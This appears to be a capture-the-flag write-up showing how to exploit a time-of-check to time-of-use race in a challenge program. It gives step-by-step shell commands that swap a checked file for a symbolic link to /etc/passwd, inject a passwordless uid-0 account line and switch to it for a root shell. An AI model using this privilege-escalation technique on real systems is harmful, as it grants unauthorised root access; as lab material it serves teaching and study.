Hacker can use the race condition to create a symbolic link such that the etc/passwd file is accessed instead and use adduser with a 0 to add a user with root permissions.

The race condition is caused by the fact that there is a delay between when the file is checked (access) and the file is opened (fopen). This allows the hacker to change the file after the check but before the write. The hacker can exploit this using the following steps:
1. create the ~/permitted file
2. run the chal in the background
3. create a symbolic link from ~/permitted to /etc/passwd
4. write a root user and press enter i.e. 
root2::0:0:root2:/home/root2:/bin/bash
5. The hacker can then log in as the new root2 user and have a root shell (because root == 0 uid).
su root2

```sh
touch ~/permitted
cd /challenge
./chal
<ctrl+z> # to pause the process
ln -sf /etc/passwd ~/permitted
fg
root2::0:0:root2:/home/root2:/bin/bash
su root2
cat /flag.txt
```
